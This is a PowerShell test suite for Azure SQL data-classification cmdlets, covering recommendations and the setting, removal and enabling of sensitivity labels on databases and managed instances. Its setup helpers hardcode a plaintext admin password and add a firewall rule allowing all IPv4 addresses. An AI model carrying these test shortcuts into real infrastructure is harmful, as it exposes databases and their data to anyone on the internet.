














function Test-BasicDataClassificationOnSqlManagedDatabase
{
	
	$testSuffix = getAssetName
	Create-ManagedDataClassificationTestEnvironment $testSuffix
	$params = Get-DataClassificationManagedTestEnvironmentParameters $testSuffix

	try
	{
		
		$recommendations = Get-AzSqlInstanceDatabaseSensitivityRecommendation -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual 0 ($recommendations.SensitivityLabels).count
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.serverName $recommendations.InstanceName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName

		
		$recommendations = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityRecommendation 
		Assert-AreEqual 0 ($recommendations.SensitivityLabels).count
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.serverName $recommendations.InstanceName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName

		
		$allClassifications = Get-AzSqlInstanceDatabaseSensitivityClassification -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual 0 ($allClassifications.SensitivityLabels).count
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.serverName $allClassifications.InstanceName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName
		
		
		$allClassifications = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityClassification
		Assert-AreEqual 0 ($allClassifications.SensitivityLabels).count
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.serverName $allClassifications.InstanceName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName

		
		Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityRecommendation | Set-AzSqlInstanceDatabaseSensitivityClassification
		
		
		Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityClassification | Remove-AzSqlInstanceDatabaseSensitivityClassification
	}
	finally
	{
		
		Remove-DataClassificationManagedTestEnvironment $testSuffix
	}
}


function Test-DataClassificationOnSqlManagedDatabase
{
	
	$testSuffix = getAssetName
	Create-ManagedDataClassificationTestEnvironment $testSuffix
	$params = Get-DataClassificationManagedTestEnvironmentParameters $testSuffix

	try
	{
		
		$recommendations = Get-AzSqlInstanceDatabaseSensitivityRecommendation -ResourceGroupName $params.rgname -InstanceName $params.ServerName -DatabaseName $params.databaseName
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.ServerName $recommendations.InstanceName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName
		
		$recommendationsCount = ($recommendations.SensitivityLabels).count
		Assert-AreEqual 4 $recommendationsCount
		
		$firstRecommendation = ($recommendations.SensitivityLabels)[0]
		$firstSchemaName = $firstRecommendation.SchemaName
		$firstTableName = $firstRecommendation.TableName
		$firstColumnName = $firstRecommendation.ColumnName
		$firstInformationType = $firstRecommendation.InformationType
		$firstSensitivityLabel = $firstRecommendation.SensitivityLabel

		Assert-AreEqual "dbo" $firstSchemaName
		Assert-AreEqual "Persons" $firstTableName
		Assert-NotNullOrEmpty $firstColumnName
		Assert-NotNullOrEmpty $firstInformationType
		Assert-NotNullOrEmpty $firstSensitivityLabel

		$secondRecommendation = ($recommendations.SensitivityLabels)[1]
		$secondSchemaName = $secondRecommendation.SchemaName
		$secondTableName = $secondRecommendation.TableName
		$secondColumnName = $secondRecommendation.ColumnName
		$secondInformationType = $secondRecommendation.InformationType
		$secondSensitivityLabel = $secondRecommendation.SensitivityLabel

		Assert-AreEqual "dbo" $secondSchemaName
		Assert-AreEqual "Persons" $secondTableName
		Assert-NotNullOrEmpty $secondColumnName
		Assert-NotNullOrEmpty $secondInformationType
		Assert-NotNullOrEmpty $secondSensitivityLabel

		
		
		Set-AzSqlInstanceDatabaseSensitivityClassification -ResourceGroupName $params.rgname -InstanceName $params.ServerName -DatabaseName $params.databaseName -SchemaName $firstSchemaName -TableName $firstTableName -ColumnName $firstColumnName -InformationType $firstInformationType -SensitivityLabel $firstSensitivityLabel
		Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.ServerName -Name $params.databaseName | Set-AzSqlInstanceDatabaseSensitivityClassification -SchemaName $secondSchemaName -TableName $secondTableName -ColumnName $secondColumnName -InformationType $secondInformationType -SensitivityLabel $secondSensitivityLabel
		
		$allClassifications = Get-AzSqlInstanceDatabaseSensitivityClassification -ResourceGroupName $params.rgname -InstanceName $params.ServerName -DatabaseName $params.databaseName
		$allClassificationsCount = ($allClassifications.SensitivityLabels).count
		Assert-AreEqual 2 $allClassificationsCount
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.ServerName $allClassifications.InstanceName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName
		
		$firstClassification = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.ServerName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityClassification -SchemaName $firstSchemaName -TableName $firstTableName -ColumnName $firstColumnName
		Assert-AreEqual 1 ($firstClassification.SensitivityLabels).count
		$classification = ($firstClassification.SensitivityLabels)[0]
		Assert-AreEqual $firstSchemaName $classification.SchemaName
		Assert-AreEqual $firstTableName $classification.TableName
		Assert-AreEqual $firstColumnName $classification.ColumnName
		Assert-AreEqual $firstInformationType $classification.InformationType
		Assert-AreEqual $firstSensitivityLabel $classification.SensitivityLabel
		
		$secondClassification = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.ServerName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityClassification -SchemaName $secondSchemaName -TableName $secondTableName -ColumnName $secondColumnName
		Assert-AreEqual 1 ($secondClassification.SensitivityLabels).count
		$classification = ($secondClassification.SensitivityLabels)[0]
		Assert-AreEqual $secondSchemaName $classification.SchemaName
		Assert-AreEqual $secondTableName $classification.TableName
		Assert-AreEqual $secondColumnName $classification.ColumnName
		Assert-AreEqual $secondInformationType $classification.InformationType
		Assert-AreEqual $secondSensitivityLabel $classification.SensitivityLabel
		
		
		$recommendations = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.ServerName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityRecommendation
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.ServerName $recommendations.InstanceName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName
		Assert-AreEqual 2 ($recommendations.SensitivityLabels).count
		
		
		Remove-AzSqlInstanceDatabaseSensitivityClassification -ResourceGroupName $params.rgname -InstanceName $params.ServerName -DatabaseName $params.databaseName -SchemaName $secondSchemaName -TableName $secondTableName -ColumnName $secondColumnName
		
		$allClassifications = Get-AzSqlInstanceDatabaseSensitivityClassification -ResourceGroupName $params.rgname -InstanceName $params.ServerName -DatabaseName $params.databaseName
		$allClassificationsCount = ($allClassifications.SensitivityLabels).count
		Assert-AreEqual 1 $allClassificationsCount
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.ServerName $allClassifications.InstanceName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName
		 
		
		$recommendations = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.ServerName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityRecommendation
		Assert-AreEqual 3 ($recommendations.SensitivityLabels).count
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.ServerName $recommendations.InstanceName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName
		
		
		Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.ServerName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityRecommendation | Set-AzSqlInstanceDatabaseSensitivityClassification
		
		$recommendations = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.ServerName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityRecommendation
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.ServerName $recommendations.InstanceName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName
		Assert-AreEqual 0 ($recommendations.SensitivityLabels).count
		
		$allClassifications = Get-AzSqlInstanceDatabaseSensitivityClassification -ResourceGroupName $params.rgname -InstanceName $params.ServerName -DatabaseName $params.databaseName
		$allClassificationsCount = ($allClassifications.SensitivityLabels).count
		Assert-AreEqual 4 $allClassificationsCount
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.ServerName $allClassifications.InstanceName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName
		
		
		Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.ServerName -Name $params.databaseName | Remove-AzSqlInstanceDatabaseSensitivityClassification -SchemaName $secondSchemaName -TableName $secondTableName -ColumnName $secondColumnName
		
		$allClassifications = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.ServerName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityClassification
		$allClassificationsCount = ($allClassifications.SensitivityLabels).count
		Assert-AreEqual 3 $allClassificationsCount
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.ServerName $allClassifications.InstanceName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName
		
		
		Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.ServerName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityClassification | Remove-AzSqlInstanceDatabaseSensitivityClassification
		$allClassifications = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.ServerName -Name $params.databaseName | Get-AzSqlInstanceDatabaseSensitivityClassification
		$allClassificationsCount = ($allClassifications.SensitivityLabels).count
		Assert-AreEqual 0 $allClassificationsCount
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.ServerName $allClassifications.InstanceName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName
	}
	finally
	{
		
		Remove-DataClassificationManagedTestEnvironment $testSuffix
	}
}


function Test-DataClassificationOnSqlDatabase
{
	
	$testSuffix = getAssetName
	Create-SqlDataClassificationTestEnvironment $testSuffix
	$params = Get-DataClassificationTestEnvironmentParameters $testSuffix

	try
	{
		
		$recommendations = Get-AzSqlDatabaseSensitivityRecommendation -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.serverName $recommendations.ServerName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName
		
		$recommendationsCount = ($recommendations.SensitivityLabels).count
		Assert-AreEqual 4 $recommendationsCount
		
		$firstRecommendation = ($recommendations.SensitivityLabels)[0]
		$firstSchemaName = $firstRecommendation.SchemaName
		$firstTableName = $firstRecommendation.TableName
		$firstColumnName = $firstRecommendation.ColumnName
		$firstInformationType = $firstRecommendation.InformationType
		$firstSensitivityLabel = $firstRecommendation.SensitivityLabel

		Assert-AreEqual "dbo" $firstSchemaName
		Assert-AreEqual "Persons" $firstTableName
		Assert-NotNullOrEmpty $firstColumnName
		Assert-NotNullOrEmpty $firstInformationType
		Assert-NotNullOrEmpty $firstSensitivityLabel

		$secondRecommendation = ($recommendations.SensitivityLabels)[1]
		$secondSchemaName = $secondRecommendation.SchemaName
		$secondTableName = $secondRecommendation.TableName
		$secondColumnName = $secondRecommendation.ColumnName
		$secondInformationType = $secondRecommendation.InformationType
		$secondSensitivityLabel = $secondRecommendation.SensitivityLabel

		Assert-AreEqual "dbo" $secondSchemaName
		Assert-AreEqual "Persons" $secondTableName
		Assert-NotNullOrEmpty $secondColumnName
		Assert-NotNullOrEmpty $secondInformationType
		Assert-NotNullOrEmpty $secondSensitivityLabel

		
		
		Set-AzSqlDatabaseSensitivityClassification -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -SchemaName $firstSchemaName -TableName $firstTableName -ColumnName $firstColumnName -InformationType $firstInformationType -SensitivityLabel $firstSensitivityLabel
		Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Set-AzSqlDatabaseSensitivityClassification -SchemaName $secondSchemaName -TableName $secondTableName -ColumnName $secondColumnName -InformationType $secondInformationType -SensitivityLabel $secondSensitivityLabel

		$allClassifications = Get-AzSqlDatabaseSensitivityClassification -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$allClassificationsCount = ($allClassifications.SensitivityLabels).count
		Assert-AreEqual 2 $allClassificationsCount
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.serverName $allClassifications.ServerName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName
		
		$firstClassification = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityClassification -SchemaName $firstSchemaName -TableName $firstTableName -ColumnName $firstColumnName
		Assert-AreEqual 1 ($firstClassification.SensitivityLabels).count
		$classification = ($firstClassification.SensitivityLabels)[0]
		Assert-AreEqual $firstSchemaName $classification.SchemaName
		Assert-AreEqual $firstTableName $classification.TableName
		Assert-AreEqual $firstColumnName $classification.ColumnName
		Assert-AreEqual $firstInformationType $classification.InformationType
		Assert-AreEqual $firstSensitivityLabel $classification.SensitivityLabel

		$secondClassification = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityClassification -SchemaName $secondSchemaName -TableName $secondTableName -ColumnName $secondColumnName
		Assert-AreEqual 1 ($secondClassification.SensitivityLabels).count
		$classification = ($secondClassification.SensitivityLabels)[0]
		Assert-AreEqual $secondSchemaName $classification.SchemaName
		Assert-AreEqual $secondTableName $classification.TableName
		Assert-AreEqual $secondColumnName $classification.ColumnName
		Assert-AreEqual $secondInformationType $classification.InformationType
		Assert-AreEqual $secondSensitivityLabel $classification.SensitivityLabel

		
		$recommendations = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityRecommendation
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.serverName $recommendations.ServerName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName
		Assert-AreEqual 2 ($recommendations.SensitivityLabels).count

		
		Remove-AzSqlDatabaseSensitivityClassification -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -SchemaName $secondSchemaName -TableName $secondTableName -ColumnName $secondColumnName
		
		$allClassifications = Get-AzSqlDatabaseSensitivityClassification -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$allClassificationsCount = ($allClassifications.SensitivityLabels).count
		Assert-AreEqual 1 $allClassificationsCount
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.serverName $allClassifications.ServerName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName

		
		$recommendations = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityRecommendation
		Assert-AreEqual 3 ($recommendations.SensitivityLabels).count
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.serverName $recommendations.ServerName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName

		
		Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityRecommendation | Set-AzSqlDatabaseSensitivityClassification
		
		$recommendations = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityRecommendation
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.serverName $recommendations.ServerName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName
		Assert-AreEqual 0 ($recommendations.SensitivityLabels).count

		$allClassifications = Get-AzSqlDatabaseSensitivityClassification -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$allClassificationsCount = ($allClassifications.SensitivityLabels).count
		Assert-AreEqual 4 $allClassificationsCount
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.serverName $allClassifications.ServerName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName

		
		Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Remove-AzSqlDatabaseSensitivityClassification -SchemaName $secondSchemaName -TableName $secondTableName -ColumnName $secondColumnName
		
		$allClassifications = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityClassification
		$allClassificationsCount = ($allClassifications.SensitivityLabels).count
		Assert-AreEqual 3 $allClassificationsCount
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.serverName $allClassifications.ServerName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName

		
		Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityClassification | Remove-AzSqlDatabaseSensitivityClassification
		$allClassifications = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityClassification
		$allClassificationsCount = ($allClassifications.SensitivityLabels).count
		Assert-AreEqual 0 $allClassificationsCount
		Assert-AreEqual $params.rgname $allClassifications.ResourceGroupName
		Assert-AreEqual $params.serverName $allClassifications.ServerName
		Assert-AreEqual $params.databaseName $allClassifications.DatabaseName
	}
	finally
	{
		
		Remove-DataClassificationTestEnvironment $testSuffix
	}
}


function Test-ErrorIsThrownWhenInvalidClassificationIsSet
{
	
	$testSuffix = getAssetName
	Create-SqlDataClassificationTestEnvironment $testSuffix
	$params = Get-DataClassificationTestEnvironmentParameters $testSuffix

	try
	{
		
		$recommendations = Get-AzSqlDatabaseSensitivityRecommendation -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		
		$recommendation = ($recommendations.SensitivityLabels)[0]
		$schemaName = $recommendation.SchemaName
		$tableName = $recommendation.TableName
		$columnName = $recommendation.ColumnName
		$informationType = $recommendation.InformationType
		$sensitivityLabel = $recommendation.SensitivityLabel
		
		
		$badInformationType =  $informationType + $informationType
		$badInformationTypeMessage = "Information Type '" + $badinformationType + "' is not part of Information Protection Policy. Please add '" + $badinformationType + "' to the Information Protection Policy, or use one of the following: "
		Assert-ThrowsContains -script { Set-AzSqlDatabaseSensitivityClassification -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -SchemaName $schemaName -TableName $tableName -ColumnName $columnName -InformationType $badInformationType `
		-SensitivityLabel $sensitivityLabel} -message $badInformationTypeMessage

		
		$badSensitivityLabel = $sensitivityLabel + $sensitivityLabel
		$badSensitivityLabelMessage = "Sensitivity Label '" + $badSensitivityLabel + "' is not part of Information Protection Policy. Please add '" + $badSensitivityLabel + "' to the Information Protection Policy, or use one of the following: "
		Assert-ThrowsContains -script { Set-AzSqlDatabaseSensitivityClassification -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -SchemaName $schemaName -TableName $tableName -ColumnName $columnName -InformationType $badInformationType `
		-SensitivityLabel $badSensitivityLabel} -message $badSensitivityLabelMessage
		
		
		$message = "Value is not specified neither for InformationType parameter nor for SensitivityLabel parameter"
		Assert-ThrowsContains -script { Set-AzSqlDatabaseSensitivityClassification -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -SchemaName $schemaName -TableName $tableName -ColumnName $columnName} -message $message
	}
	finally
	{
		
		Remove-DataClassificationTestEnvironment $testSuffix
	}
}

function Assert-NotNullOrEmpty ($str)
{
	Assert-NotNull $str
	Assert-AreNotEqual "" $str
}


function Get-DataClassificationTestEnvironmentParameters ($testSuffix)
{
	return @{ rgname = "dc-cmdlet-test-rg" +$testSuffix;
			  serverName = "dc-cmdlet-server" +$testSuffix;
			  databaseName = "dc-cmdlet-db" + $testSuffix;
			  loginName = "testlogin";
			  pwd = "testp@ssMakingIt1007Longer";
		}
}


function Get-DataClassificationManagedTestEnvironmentParameters ($testSuffix)
{
	return @{ rgname = "cl_one";
			  serverName = "dc-cmdlet-server" +$testSuffix;
			  databaseName = "dc-cmdlet-db" + $testSuffix;
			  loginName = "testlogin";
			  pwd = "testp@ssMakingIt1007Longer";
		}
}


function Create-ManagedDataClassificationTestEnvironment ($testSuffix, $location = "North Europe")
{
	$params = Get-DataClassificationManagedTestEnvironmentParameters $testSuffix
	
	New-AzureRmResourceGroup -Name $params.rgname -Location $location
	
	
	$vnetName = "cl_initial"
	$subnetName = "Cool"
	$virtualNetwork1 = CreateAndGetVirtualNetworkForManagedInstance $vnetName $subnetName $location
	$subnetId = $virtualNetwork1.Subnets.where({ $_.Name -eq $subnetName })[0].Id
	
	$credentials = Get-ServerCredential
 	$licenseType = "BasePrice"
  	$storageSizeInGB = 32
 	$vCore = 16
 	$skuName = "GP_Gen4"
	$collation = "SQL_Latin1_General_CP1_CI_AS"

	$managedInstance = New-AzSqlInstance -ResourceGroupName $params.rgname -Name $params.serverName `
 			-Location $location -AdministratorCredential $credentials -SubnetId $subnetId `
  			-LicenseType $licenseType -StorageSizeInGB $storageSizeInGB -Vcore $vCore -SkuName $skuName

	New-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName -Collation $collation
}


function Remove-DataClassificationManagedTestEnvironment ($testSuffix)
{
	$params = Get-DataClassificationManagedTestEnvironmentParameters $testSuffix
	Remove-AzureRmResourceGroup -Name $params.rgname -Force
}


function Remove-DataClassificationTestEnvironment ($testSuffix)
{
	$params = Get-DataClassificationTestEnvironmentParameters $testSuffix
	Remove-AzureRmResourceGroup -Name $params.rgname -Force
}


function Create-SqlDataClassificationTestEnvironment ($testSuffix, $location = "West Central US", $serverVersion = "12.0")
{
	$params = Get-DataClassificationTestEnvironmentParameters $testSuffix
	
	New-AzResourceGroup -Name $params.rgname -Location $location

	$password = $params.pwd
    $secureString = ($password | ConvertTo-SecureString -asPlainText -Force)
    $credentials = new-object System.Management.Automation.PSCredential($params.loginName, $secureString)
    New-AzSqlServer -ResourceGroupName  $params.rgname -ServerName $params.serverName -ServerVersion $serverVersion -Location $location -SqlAdministratorCredentials $credentials
	New-AzSqlServerFirewallRule -ResourceGroupName  $params.rgname -ServerName $params.serverName -StartIpAddress 0.0.0.0 -EndIpAddress 255.255.255.255 -FirewallRuleName "dcRule"


	New-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
	
	if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -eq "Record")
	{
		$fullServerName = $params.serverName + ".database.windows.net"
		$login = $params.loginName
		$databaseName = $params.databaseName

		$connection = New-Object System.Data.SqlClient.SqlConnection
		$connection.ConnectionString = "Server=$fullServerName;uid=$login;pwd=$password;Database=$databaseName;Integrated Security=False;"
		try
		{
			$connection.Open()

			$command = $connection.CreateCommand()
			$command.CommandText = "CREATE TABLE Persons (PersonID int, LastName varchar(255), FirstName varchar(255), Address varchar(255), City varchar(255));"
			$command.ExecuteReader()
		}
		finally
		{
			$connection.Close()
		}
	}
}


function Test-EnableDisableRecommendationsOnSqlDatabase
{
	
	$testSuffix = getAssetName
	Create-SqlDataClassificationTestEnvironment $testSuffix
	$params = Get-DataClassificationTestEnvironmentParameters $testSuffix

	try
	{
		
		$recommendations = Get-AzSqlDatabaseSensitivityRecommendation -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.serverName $recommendations.ServerName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName

		$recommendationsCount = ($recommendations.SensitivityLabels).count
		Assert-AreEqual 4 $recommendationsCount

		$firstRecommendation = ($recommendations.SensitivityLabels)[0]
		$firstSchemaName = $firstRecommendation.SchemaName
		$firstTableName = $firstRecommendation.TableName
		$firstColumnName = $firstRecommendation.ColumnName
		$firstInformationType = $firstRecommendation.InformationType
		$firstSensitivityLabel = $firstRecommendation.SensitivityLabel

		Assert-AreEqual "dbo" $firstSchemaName
		Assert-AreEqual "Persons" $firstTableName
		Assert-NotNullOrEmpty $firstColumnName
		Assert-NotNullOrEmpty $firstInformationType
		Assert-NotNullOrEmpty $firstSensitivityLabel

		$secondRecommendation = ($recommendations.SensitivityLabels)[1]
		$secondSchemaName = $secondRecommendation.SchemaName
		$secondTableName = $secondRecommendation.TableName
		$secondColumnName = $secondRecommendation.ColumnName
		$secondInformationType = $secondRecommendation.InformationType
		$secondSensitivityLabel = $secondRecommendation.SensitivityLabel

		Assert-AreEqual "dbo" $secondSchemaName
		Assert-AreEqual "Persons" $secondTableName
		Assert-NotNullOrEmpty $secondColumnName
		Assert-NotNullOrEmpty $secondInformationType
		Assert-NotNullOrEmpty $secondSensitivityLabel

		
		Disable-AzSqlDatabaseSensitivityRecommendation -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -SchemaName $firstSchemaName -TableName $firstTableName -ColumnName $firstColumnName
		Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Disable-AzSqlDatabaseSensitivityRecommendation -SchemaName $secondSchemaName -TableName $secondTableName -ColumnName $secondColumnName

		
		$recommendations = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityRecommendation
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.serverName $recommendations.ServerName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName
		Assert-AreEqual 2 ($recommendations.SensitivityLabels).count

		
		Assert-AreNotEqual $firstColumnName ($recommendations.SensitivityLabels)[0].ColumnName
		Assert-AreNotEqual $firstColumnName ($recommendations.SensitivityLabels)[1].ColumnName
		Assert-AreNotEqual $secondColumnName ($recommendations.SensitivityLabels)[0].ColumnName
		Assert-AreNotEqual $secondColumnName ($recommendations.SensitivityLabels)[1].ColumnName

		
		Enable-AzSqlDatabaseSensitivityRecommendation -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -SchemaName $secondSchemaName -TableName $secondTableName -ColumnName $secondColumnName

		
		$recommendations = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityRecommendation
		Assert-AreEqual 3 ($recommendations.SensitivityLabels).count
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.serverName $recommendations.ServerName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName

		
		Assert-AreNotEqual $firstColumnName ($recommendations.SensitivityLabels)[0].ColumnName
		Assert-AreNotEqual $firstColumnName ($recommendations.SensitivityLabels)[1].ColumnName
		Assert-AreNotEqual $firstColumnName ($recommendations.SensitivityLabels)[2].ColumnName

		
		Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityRecommendation | Disable-AzSqlDatabaseSensitivityRecommendation

		
		$recommendations = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityRecommendation
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.serverName $recommendations.ServerName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName
		Assert-AreEqual 0 ($recommendations.SensitivityLabels).count

		
		Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Enable-AzSqlDatabaseSensitivityRecommendation -SchemaName $secondSchemaName -TableName $secondTableName -ColumnName $secondColumnName

		
		$recommendations = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseSensitivityRecommendation
		Assert-AreEqual $params.rgname $recommendations.ResourceGroupName
		Assert-AreEqual $params.serverName $recommendations.ServerName
		Assert-AreEqual $params.databaseName $recommendations.DatabaseName
		Assert-AreEqual 1 ($recommendations.SensitivityLabels).count

		$recommendation = ($recommendations.SensitivityLabels)[0]
		Assert-AreEqual $secondSchemaName $recommendation.SchemaName
		Assert-AreEqual $secondTableName $recommendation.TableName
		Assert-AreEqual $secondColumnName $recommendation.ColumnName
		Assert-NotNullOrEmpty $recommendation.InformationType
		Assert-NotNullOrEmpty $recommendation.SensitivityLabel
	}
	finally
	{
		
		Remove-DataClassificationTestEnvironment $testSuffix
	}
}
